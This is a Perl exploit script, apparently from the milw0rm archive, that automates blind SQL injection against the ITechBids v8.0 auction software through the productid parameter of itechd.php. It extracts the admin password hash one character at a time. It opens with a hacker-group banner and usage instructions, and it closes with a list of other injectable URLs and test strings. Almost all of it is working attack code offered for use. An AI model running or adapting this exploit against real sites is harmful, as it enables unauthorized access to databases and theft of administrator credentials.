#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;
if(!$ARGV[1])
{
print " \n";
print " ################## VIVA ISLAME VIVA ISLAME ####################\n";
print " ################## VIVA ISLAME VIVA ISLAME ####################\n";
print " ## ##\n";
print " ## ITechBids v8.0 Blind SQL Injection Exploit ##\n";
print " ## ##\n";
print " ## ( itechd.php productid ) ##\n";
print " ## http://itechbids.com/ ##\n";
print " ## ##\n";
print " ## Author: Mr.SQL -(:: SYRIAN HACKERS ::)- ##\n";
print " ## EMAIL : SQL(at)HOTMAIL.IT ##\n";
print " ## HOME : WwW.55a.NeT ##\n";
print " ## ##\n";
print " ## -((:: !GrE3E3E3E3E3ETZz! ::))- ##\n";
print " ## ##\n";
print " ## - HaCkEr_EGy - His0k4 - Dark MaSTer - MoHaMaD AL 3rab - ##\n";
print " ## - Milw0rM - Ghost Hacker - ##\n";
print " ## ##\n";
print " ## <<>> MuSliMs HaCkErS <<>> ##\n";
print " ## ##\n";
print " ## Usage : perl exploit.pl host ##\n";
print " ## Example: perl exploit.pl www.host.com / -d 10 ##\n";
print " ## ##\n";
print " ## Options: ##\n";
print " ## -d valid productid value ##\n";
print " ###############################################################\n";
print " ###############################################################\n";
exit;
}

my $host = $ARGV[0];
my $productid = $ARGV[2];
my %options = ();
GetOptions(\%options, "u=i", "p=s", "d=i");
print "[~] Exploiting...\n";
if($options{"u"})
{
$productid = $options{"u"};
}
if($options{"d"})
{
$productid = $options{"d"};
}
syswrite(STDOUT, "[~] MD5-Hash: ", 14);

for(my $i = 1; $i <= 32; $i++)
{
my $f = 0;
my $h = 48;
while(!$f && $h <= 57)
{
if(istrue2($host, $productid, $i, $h))
{
$f = 1;
syswrite(STDOUT, chr($h), 1);
}
$h++;
}
if(!$f)
{
$h = 97;
while(!$f && $h <= 122)
{
if(istrue2($host, $productid, $i, $h))
{
$f = 1;
syswrite(STDOUT, chr($h), 1);
}
$h++;
}
}
}
print "\n[~] Exploiting done\n";
sub istrue2
{
my $host = shift;
my $productid = shift;
my $i = shift;
my $h = shift;
my $ua = LWP::UserAgent->new;
my $query = "http://".$host."itechd.php?productid=".$productid." and (SUBSTRING((SELECT password FROM admin LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
if($productid{"p"})
{
$ua->proxy('http', "http://".$productid{"p"});
}
my $resp = $ua->get($query);
my $content = $resp->content;
my $regexp = "1&cat_a";
if($content =~ /$regexp/)
{
return 1;
}
else
{
return 0;
}
}

# ........
# others files :))

##############################################################
# http://www.Target.com/feedback.php?user_id=1 << and 1=0
# http://www.Target.com/category.php?cate_id=1 << and 1=0
# http://www.Target.com/classifieds.php?productid=1 << and 1=0
# http://www.Target.com/sellers_othersitem.php?seller_id=1 << and 1=0
# http://www.Target.com/feedback.php?user_id=1 << and 1=0
# http://www.Target.com/category.php?cate_id=1 << and 1=0
# http://www.Target.com/news.php?id=1 << and 1=0
# http://www.Target.com/shop.php?id=1 << and 1=0
##############################################################

# milw0rm.com [2009-08-24]
